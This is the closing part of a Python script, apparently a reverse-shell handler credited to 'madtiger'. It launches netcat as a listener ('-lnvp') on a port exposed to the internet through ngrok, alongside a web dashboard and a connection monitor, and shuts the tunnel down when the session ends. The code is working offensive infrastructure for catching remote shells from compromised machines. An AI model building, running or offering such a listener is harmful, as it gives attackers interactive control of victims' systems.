    ev(f"dashboard live → {web_url}")
    if not args.no_browser:
        threading.Thread(target=webbrowser.open, args=(web_url,),
                         daemon=True).start()

    threading.Thread(target=monitor_connections, args=(port,),
                     daemon=True).start()

    listening_box(host, pub, port, web_url)

    try:
        nc = subprocess.Popen([nc_bin] + nc_keep + ["-lnvp", str(port)])
        STATE["nc"] = nc
        nc.wait()
    except KeyboardInterrupt:
        pass
    finally:
        nc = STATE["nc"]
        if nc and nc.poll() is None:
            nc.terminate()
        stop_ngrok(ngrok)
        try:
            httpd.shutdown()
        except Exception:
            pass
    print(f"\n  {DIM}session closed · ngrok torn down · revshell by madtiger{RESET}")


if __name__ == "__main__":
    main()
